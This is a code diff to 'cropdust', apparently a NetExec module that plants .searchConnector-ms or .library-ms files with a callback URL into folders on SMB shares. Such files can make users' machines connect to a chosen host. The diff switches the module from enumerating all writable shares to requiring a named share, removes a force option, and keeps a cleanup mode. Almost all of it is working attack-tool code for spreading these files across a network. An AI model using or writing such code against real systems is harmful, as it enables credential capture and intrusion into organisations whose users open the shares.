@@ -13,8 +13,7 @@ class CropDuster:
         cleanup,
         type,
         share,
-        folder,
-        force):
+        folders):
 
             
         self.smb = smb
@@ -27,186 +26,72 @@ class CropDuster:
         self.cleanup = cleanup
         self.type = type
         self.share = share
-        self.folder = folder
-        self.force = force
+        self.folders = folders
 
-
-    def get_suitable_shares(self, avbl_shares):
-         
-        shares = []
-        # if a specific share is chosen
-        # this bit loops through avbl shares to find it (hopefully)
-        if self.share != "All":
-            for share in avbl_shares:
-                share_name = share["name"]
-                if share_name == self.share:
-                    # found it
-                    self.logger.success(f'Found share:\t{self.share}')
-                    # add it to shares list
-                    shares.append(share)
-                    break
-            # if we couldnt find the share, bail
-            if not shares:
-                self.logger.fail(f'Cannot find share:\t{self.share}')
-                return
-        # if no specific share has been chosen
-        # just add all available shares
-        else:
-            shares = avbl_shares
-
-        # now we've got a list of shares
-        # we need writable ones that aren't admin ones
-        # or if force is enabled, whichever ones were chosen    
-        try:
-            # our final share list
-            suitable_shares = []
-
-            # loop through the shares
-            for share in shares:
-                # get the names and perms
-                share_perms = share["access"]
-                share_name = share["name"]
-                self.logger.display(f'Share "{share_name}" has perms {share_perms}')
-
-                if share_name in ['C$', 'ADMIN$'] and self.share == "All":
-                    # skip only if user did not explicitly choose a share
-                    self.logger.fail(f'Share "{share_name}" not explicitly requested, skipping')
-                    continue
-                # if the share is writable
-                # add it and move on to the next share
-                if "WRITE" in share_perms:
-                    self.logger.success(f'{share_name} is writable')
-                    suitable_shares.append(share_name)
-                    continue
-                else:
-                    self.logger.fail(f'Share "{share_name}" is not writable')
-                        # check if force is set
-                        # if it is, add to our list anyway
-                    if self.force == False:
-                        self.logger.display(f'Force is set to false, not adding {share_name} to list')
-                        continue
-                    else:
-                        self.logger.display(f'Force is set to true, adding {share_name} anyway')
-                        suitable_shares.append(share_name)
-                        continue
-
-            # now we've got some suitable shares
-            # lets print them
-            if suitable_shares:
-                self.logger.display(f'Shares to use:')
-                for share in suitable_shares:
-                    self.logger.success(f'{share}')
-                self.logger.display('')
-            # quit if no suitable shares
-            else:
-                self.logger.fail('No suitable shares')
-                return
-
-            # check if a specific folder was chosen
-            for share in suitable_shares:
-                if self.folder != "All":
-                    self.logger.display(f'Folder to use:')
-                    self.logger.success(f'{self.folder}')
-                    self.process_dirs(share, self.folder)
-                else:
-                    self.process_dirs(share, "\\")
-                self.logger.display('')
-
-        # some unknown error
-        except Exception as e:
-            self.logger.fail(f"Error enumerating shares:\t{e!s}")
-
-
-    def get_dirs(self, share, folder="\\"):
-        self.logger.display("Getting accessible directories")
-        item_list = []
-        try:
-            items = self.smb.conn.listPath(share, folder + "*")
-            for item in items:
-                if not item.is_directory() or item.get_longname() in ['.', '..']:
-                    continue
-
-                dir_path = f"{folder}{item.get_longname()}\\"
-
-                # check if we can list contents
-                try:
-                    self.smb.conn.listPath(share, dir_path + "*")
-                    can_access = True
-                except Exception:
-                    self.logger.display(f"{dir_path} not accessible, skipping")
-                    can_access = False
-
-                if can_access:
-                    item_list.append(dir_path)
-                    # recurse into this dir
-                    item_list.extend(self.get_dirs(share, dir_path))
-
-        except Exception as e:
-            self.logger.fail(f"Error: {e}")
-
-        return item_list
-
-
-    def process_dirs(self, share, folder):
-
-        try:
-            items = self.smb.conn.listPath(share, folder + "*")
-        except Exception:
-            # self.logger.display(f"{folder} not accessible, skipping")
-            return
+    
+    def get_dirs(self, share, path="\\"):
+        results = []
+        items = self.smb.conn.listPath(share, path + "*")
 
         for item in items:
-            if not item.is_directory() or item.get_longname() in ['.', '..']:
+            name = item.get_longname()
+            if name in ['.', '..'] or not item.is_directory():
                 continue
 
-            dir_path = f"{folder}{item.get_longname()}\\"
-
-            # check access
+            dir_path = path + name + "\\"
+            results.append(dir_path)
             try:
-                self.smb.conn.listPath(share, dir_path + "*")
-                can_access = True
+                results.extend(self.get_dirs(share, dir_path))
             except Exception:
-                # self.logger.fail(f"{dir_path} not accessible, skipping")
-                can_access = False
+                continue
 
-            if can_access:
-                # drop or clean
-                extension = ".searchConnector-ms" if self.type == "search" else ".library-ms"
-                file_name = self.filename + extension
-                remote_path = ntpath.join(dir_path, file_name)
-                try:
-                    if self.cleanup:
-                        self.smb.conn.deleteFile(share, remote_path)
-                        self.logger.success(f"Cleaned: {share}{remote_path}")
-                        # self.results.setdefault(share, []).append((dir_path, "cleaned"))
-                    else:
-                        with open(self.scfile_path, "rb") as scfile:
-                            self.smb.conn.putFile(share, remote_path, scfile.read)
-                        self.logger.success(f"Dropped: {share}{remote_path}")
-                        # self.results.setdefault(share, []).append((dir_path, "dropped"))
-                except Exception as e:
-                    if "0xc0000022 - STATUS_ACCESS_DENIED" in str(e):
-                    	#self.logger.fail(f"{dir_path} not writable, skipping")
-                    	pass
-                    elif "0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
-                        # self.logger.fail(f"{file_name} not found in {dir_path}, skipping")
-                        pass
-                    else:
-                        self.logger.fail(f"Error in {dir_path}: {e}")
-                        # self.results.setdefault(share, []).append((dir_path, "error"))
+        return results
 
-                # recurse into subdirs
-                self.process_dirs(share, dir_path)
 
+    def do_cropdust(self):
+ 
+        all_dirs = []
+        # if all folders on the share were chosen, get a recursive list of them
+        if self.folders == "All":
+            self.logger.display(f"Getting all accessible directories in {self.share}")
+            all_dirs = self.get_dirs(self.share)
+        # otherwise, just set the all_dirs list to self.folders
+        else:
+            dir_path = f"{self.folders}\\"
+            all_dirs.append(dir_path)
+  
+        for dir in all_dirs:
+            # drop or clean
+            extension = ".searchConnector-ms" if self.type == "search" else ".library-ms"
+            file_name = self.filename + extension
+            remote_path = ntpath.join(dir, file_name)
+            #self.logger.display(f'{remote_path}')
+            try:
+                if self.cleanup:
+                    self.smb.conn.deleteFile(self.share, remote_path)
+                    self.logger.success(f"Cleaned: {self.share}{remote_path}")
+                else:
+                    with open(self.scfile_path, "rb") as scfile:
+                        self.smb.conn.putFile(self.share, remote_path, scfile.read)
+                        self.logger.success(f"Dropped: {self.share}{remote_path}")
+            except Exception as e:
+                if "0xc0000022 - STATUS_ACCESS_DENIED" in str(e):
+                    self.logger.fail(f"{dir} not writable, skipping")
+                    pass
+                elif "0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
+                    self.logger.fail(f"{file_name} not found in {dir}, skipping")
+                    pass
+                else:
+                    self.logger.fail(f"Error in {dir}: {e}")
 
 
 class NXCModule:
 
     name = "cropdust"
-    description = "Recursively or selectively drop a .searchConnector-ms/.library-ms file into folder(s) on writable shares. Has a cleanup and force function"
+    description = "Recursively or selectively drop a .searchConnector-ms/.library-ms file into folder(s) on writable shares. Has a cleanup function"
     supported_protocols = ["smb"]
     opsec_safe = False
-    multiple_hosts = True
+    multiple_hosts = False
     category = CATEGORY.PRIVILEGE_ESCALATION
 
 
@@ -214,10 +99,9 @@ class NXCModule:
         """
         Recursively drop a .searchConnector-ms/.library-ms file into folders on writable shares.
 
+        SHARE               Specify a share to target
         URL                 URL in the dropped file to call back to, format is {HOST}@{PORT} - default is "microsoft.com@80"
-        SHARE               Specify a share to target - default is all writable shares EXCEPT for C$ and ADMIN$
         FOLDER              Specify a specific folder to write to - default is recursive
-        FORCE               Force write attempt on chosen shares - default is False
         FILENAME            Specify the filename used WITHOUT extension - default is "Documents"
         TYPE                Specify type of file to drop (search/library) - default is "search"
         CLEANUP             Clean up dropped files - default is False
@@ -239,22 +123,17 @@ class NXCModule:
             self.filename = str(module_options["FILENAME"])
 
         # chosen share
-        self.share = "All"
+        self.share = None
         if "SHARE" in module_options:
             self.share = str(module_options["SHARE"])
-        
-        # chosen folder
-        self.folder = "All"
-        if "FOLDER" in module_options and "SHARE" not in module_options:
-            context.log.fail("SHARE option is required when specifying folder")
+        else:
+            context.log.fail("SHARE name is required")
             quit()
-        elif "FOLDER" in module_options and "SHARE" in module_options:
-            self.folder = str(module_options["FOLDER"])
-
-        # force
-        self.force = False
-        if "FORCE" in module_options:
-            self.force = bool(module_options["FORCE"])
+            
+        # chosen folder
+        self.folders = "All"
+        if "FOLDER" in module_options:
+            self.folders = str(module_options["FOLDER"])
         
         # type
         self.type = "search"
@@ -314,12 +193,10 @@ class NXCModule:
         context.log.display(f"URL:      {self.url}")
         context.log.display(f"FILENAME: {self.filename}")
         context.log.display(f"SHARE:    {self.share}")
-        context.log.display(f"FOLDER:   {self.folder}")
-        context.log.display(f"FORCE:    {self.force}")
+        context.log.display(f"FOLDER:   {self.folders}")
         context.log.display(f"TYPE:     {self.type}")
         context.log.display(f"CLEANUP:  {self.cleanup}")
 
-        avbl_shares = connection.shares()
 
         cropdust = CropDuster(
             connection,
@@ -330,7 +207,6 @@ class NXCModule:
             self.cleanup,
             self.type,
             self.share,
-            self.folder,
-            self.force)
+            self.folders)
 
-        cropdust.get_suitable_shares(avbl_shares)
+        cropdust.do_cropdust()
